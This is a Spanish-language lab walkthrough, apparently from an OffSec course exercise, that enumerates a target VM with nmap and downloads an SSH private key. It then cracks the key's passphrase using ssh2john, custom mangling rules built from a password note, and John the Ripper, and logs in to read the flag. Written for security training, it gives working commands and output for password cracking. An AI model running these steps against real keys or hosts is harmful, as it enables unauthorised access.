# Walk: Password Attacks - SSH Private Key Passphrase - VM #1

## Fecha: 23/02/2025
## Host: Ubuntu
## IP: 192.168.200.201
## Objetivo
Follow the steps outlined in this section to get access to VM #1 (BRUTE) on port 2222 with SSH by cracking the passphrase of the private key. Find the flag in the home directory of the user _dave_.
## Herramientas
1. ssh2john
2. 
## Procedimiento y comandos
#### Paso 1: Accedemos a los archvios necesarios para creckear las credenciales ssh.
- Enumermos en busqueda de puertos abiertos: `nmap -sV --open 192.168.200.201` 
```
nmap -sV --open 192.168.200.201
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 14:05 -03
Nmap scan report for 192.168.200.201
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
2222/tcp open  ssh     OpenSSH 9.0 (protocol 2.0)
8080/tcp open  http    PHP cli server 5.5 or later
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds

```
> Notamos el puerto _**2222**_ corriendo _**ssh**_ y el puerto _**8080**_ corriendo TinyFileManager.
- Ingresamos con las credenciales encontradas en la unidad **_16.1.2_** : `user/121212`
- Descargamos los archivos: _**note.txt**_ y _**id_rsa**_

#### Paso 2: Autenticacion y login por ssh.
- Damos permisos a _**id_rsa**_: `chmod 600 id_rsa`
- Intentamos conectarnos: `ssh -i id_rsa -p 2222 dave@192.168.200.201`
> Ninguna de las passwords encontradas en _**note.txt**_ dan resultado. Según el archivo note.txt, se habilitó una nueva política de contraseñas en enero de 2022.

#### Paso 3: Transformar la clave privada en un formato hash.
- `ssh2john id_rsa > ssh.hash` 
```
cat ssh.hash       
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592f...55bdcf1384455aca7e3cd274fcb12b1b3a87e2e804e07e4c904ba2220fccb0a8ff829944a51f1ca7c4097256496f89174160ed831f2c4f21e411252f8fb9112deba4c3089ba2983b49d703e7f6bfbbc2b3626964dccd2e51349ec8e4949f0000058018795357c0b4addcc14f32a4c3e90627de0a9cd99324d...$16$486
```
- Determinaremos el modo con: \$sshng _**$6\$**_ 16$7059
- Eliminamos: _**"id_rsa:"**_ del archivo .hash
- Identificamos el modo: `hashcat -h | grep -i "ssh"`
```
   6700 | AIX {ssha1}                                                | Operating System
   6400 | AIX {ssha256}                                              | Operating System
   6500 | AIX {ssha512}                                              | Operating System
   1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
   1711 | SSHA-512(Base64), LDAP {SSHA512}                           | FTP, HTTP, SMTP, LDAP Server
    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                | FTP, HTTP, SMTP, LDAP Server
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                        | Enterprise Application Software (EAS)
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                      | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                  | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                      | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                      | Private Key

```
En base a la salida de 
- **22921** | RSA/DSA/EC/OpenSSH Private Keys **(\$6\$)**                      | Private Key 
#### Paso 4: Crackeamos el .hash
- Creamos un archvio de reglas, con las notas encontradas en _**note.txt**_
```
kali@kali:~/passwordattacks$ cat note.txt
Dave's password list:
Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:

New password policy starting in January 2022.
Passwords need 3 numbers, a capital letter and a special character.
```
- Creamos el archivo con estas reglas dentro:
```
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
> Estas reglas agregan: 137 al final de cada password, transforman en mayuscula la primer letra, y agregan un caracter especial al final

- Generamos un archivo con las passwords encontradas: `dave.passwords`
```
Window
rickc137
dave
superdave
megadave
umbrella
```
- Procedemos a ejecutar hashcat:
- ` hashcat -m 22921 ssh.hash dave.passwords -r ssh.rule --force`
> **Error de longitud de Token**
```
Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
No hashes loaded.
```
>**_"las claves privadas modernas y sus frases de contraseña correspondientes se crean con el cifrado aes-256-ctr, que el modo 22921 de Hashcat no admite_"**
- Utilizaremos JtR:
	- Agregamos un nombre a las reglas creadas con anterioridad: **sshRules** y las adermios a _**john.conf**_
```
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
` sh -c 'cat /home/kali/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/ssh.rule >> /etc/john/john.conf'`
- Ejecutamos JtR:
	- `john --wordlist=dave.passwords --rules=sshRules ssh.hash`
```
>>> Tres doritos despues
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Umbrella137!     (?)     
1g 0:00:00:01 DONE (2025-02-23 15:30) 0.5050g/s 9.090p/s 9.090c/s 9.090C/s Window137!..Umbrella137#
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- ssh Password: **Umbrella137!**
#### Paso 5: Obtenemos el flag:
- Nos conectamos con las credenciales obtenidas por ssh:
`ssh -i id_rsa -p 2222 dave@192.168.200.201`
```
Enter passphrase for key 'id_rsa': 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

97155f11d0d8:~$ ls
flag.txt
97155f11d0d8:~$ cat flag.txt 
OS{db5..flag..307}
97155f11d0d8:~$ 
